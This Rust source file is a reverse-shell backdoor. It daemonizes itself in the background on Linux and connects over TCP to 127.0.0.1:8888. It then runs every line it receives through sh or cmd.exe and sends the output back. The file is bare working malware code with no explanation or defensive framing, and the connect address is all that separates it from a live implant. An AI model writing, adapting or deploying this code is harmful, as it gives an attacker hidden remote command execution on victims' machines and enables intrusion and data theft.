use std::net::TcpStream;
use std::str;
use std::io::{BufRead, BufReader, Write};
use std::process::Command;

extern crate daemonize;

use daemonize::Daemonize;


fn execute_command(command: &str) -> String {
    println!("Executing command: {}", command);
    let output = if cfg!(target_os = "windows") {
        Command::new("cmd.exe")
            .args(&["/C", command])
            .output()
            .expect("failed to execute process")
    } else {
        Command::new("sh")
            .arg("-c")
            .arg(command)
            .output()
            .expect("failed to execute process")
    };
    
    let processed_output = String::from_utf8(output.stdout).expect("Could not convert output to string");
    return processed_output;
}

fn main() {
    if cfg!(target_os = "linux") {
        let daemonize = Daemonize::new()
            .pid_file("/tmp/test.pid")  
            .chown_pid_file(true)      
            .working_directory("/tmp") // changes the root directory ("/")
            .user("nobody")
            .group("daemon") // group name
            .group(2)        // or group id.
            .umask(0o777)    // Set umask, `0o027` by default.
            .privileged_action(|| "Executed before drop privileges");

        match daemonize.start() {
            Ok(_) => println!("Success, daemonized"),
            Err(e) => eprintln!("Error, {}", e),
        }
    }

    let mut stream = TcpStream::connect("127.0.0.1:8888").expect("Could not connect to server");

    loop {
        let mut buffer: Vec<u8> = Vec::new();
        let mut reader = BufReader::new(&stream);

        reader.read_until(b'\n', &mut buffer).expect("Could not read into buffer");

        let command: &str = str::from_utf8(&buffer).expect("Could not write buffer as string");
        let output: String = execute_command(command);

        stream.write(output.as_bytes()).expect("Could not write to stream");
    }
}